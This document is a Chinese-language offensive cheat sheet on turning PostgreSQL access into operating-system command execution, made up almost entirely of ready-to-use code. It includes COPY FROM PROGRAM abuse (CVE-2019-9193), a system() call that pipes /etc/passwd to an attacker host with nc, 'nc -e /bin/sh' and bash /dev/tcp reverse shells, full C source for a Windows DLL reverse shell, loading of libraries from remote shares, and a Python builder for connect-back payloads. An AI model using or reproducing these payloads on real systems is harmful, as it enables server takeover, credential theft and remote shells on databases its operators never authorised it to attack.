## 命令执行

### PROGRAM

```sql
DROP TABLE IF EXISTS myoutput;
CREATE TABLE myoutput(filename text);
COPY myoutput FROM PROGRAM 'ps aux';
SELECT * FROM myoutput ORDER BY filename ASC;
```

### CVE-2019-9193

```sql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

可以使用 Metasploit 框架直接利用：

> + multi/postgres/postgres_copy_from_program_cmd_exec
> + exploit/linux/postgres/postgres_payload

### libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

### 创建映射

```bash
apt install postgresql postgresql-server-dev-9.6
git clone https://github.com/Dionach/pgexec/tree/master
gcc -I$(/usr/local/pgsql/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
split -b 2048 pg_exec.so
```

```sql
SELECT lo_creat(-1);
set c0 `base64 -w 0 xaa`
INSERT INTO pg_largeobject (loid, pageno, data) values (16388, 0, decode(:'c0', 'base64'));
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
SELECT sys('nc -e /bin/sh 10.0.0.1 4444');
```

### UDF

[sqlmap UDF](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql)

### 语言

PostgreSQL可能安装了不同的脚本语言，可以利用语言来执行系统命令

运行指定语言
```sql
SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```

PostgreSQL中安装的大多数脚本语言有两种类型：可信的和不可信的。不受信任的版本名称以u结尾，并且该版本将允许您执行代码并使用其他有趣的功能：

> + plpythonu
> + plpython3u
> + plperlu
> + pljavaU
> + plrubyu
.....

更改指定语言为可信
```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```

如果没有看到某种语言，可以以超级管理员的权限加载
```sql
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```

执行命令
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```

### Windows DLL

1.
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
	/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	/* retrieve the second argument that is passed to the function (an integer)
	that will serve as our counter limit*/

	int instances = PG_GETARG_INT32(1);

	for (int c = 0; c < instances; c++) {
		/*launch the process passed in the first parameter*/
		ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
	}
	PG_RETURN_VOID();
}
```

dll文件
[ZIP](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/pgsql_exec.zip)

命令执行
```sql
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```

2.反向shell

```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
                    _In_ DWORD fdwReason,
                    _In_ LPVOID lpvReserved)
{
    WSADATA wsaData;
    SOCKET wsock;
    struct sockaddr_in server;
    char ip_addr[16];
    STARTUPINFOA startupinfo;
    PROCESS_INFORMATION processinfo;

    char *program = "cmd.exe";
    const char *ip = PG_REVSHELL_CALLHOME_SERVER;
    u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    wsock = WSASocket(AF_INET, SOCK_STREAM,
                      IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host;
    host = gethostbyname(ip);
    strcpy_s(ip_addr, sizeof(ip_addr),
             inet_ntoa(*((struct in_addr *)host->h_addr)));

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
              NULL, NULL, NULL, NULL);

    memset(&startupinfo, 0, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);
    startupinfo.dwFlags = STARTF_USESTDHANDLES;
    startupinfo.hStdInput = startupinfo.hStdOutput =
                            startupinfo.hStdError = (HANDLE)wsock;

    CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
                  NULL, NULL, &startupinfo, &processinfo);

    return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
    int32 arg = PG_GETARG_INT32(0);

    PG_RETURN_INT32(arg + 1);
}
```

命令执行
```sql
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```

### 大型对象

将dll文件上传后，执行查询语句
```sql
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```

自动化
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
    print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
    print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start = i * 2048
    end   = (i+1) * 2048
    if i == 0:
        sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
    else:
        sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
    end   = (i+1) * 2048
    sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
    sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```

### 配置文件RCE

#### ssl_passphrase_command

配置文件有一些有趣的属性，可能会导致 RCE:

> + ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'  //数据库私钥的路径
> + ssl_passphrase_command = ''  //如果私有文件受密码保护，postgresql 将执行此属性中指示的命令
> + ssl_passphrase_command_supports_reload = off  //如果该属性位于密钥受密码保护的情况下执行的命令将在执行 pg_reload_conf() 时执行

然后，攻击者需要：
> 1.从服务器转储私钥
> 2.加密下载的私钥： rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key
> 3.覆盖
> 4.转储当前的 postgresql配置
> 5.使用提到的属性配置覆盖配置：
    > ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'
    > ssl_passphrase_command_supports_reload = on
> 6.执行pg_reload_conf()
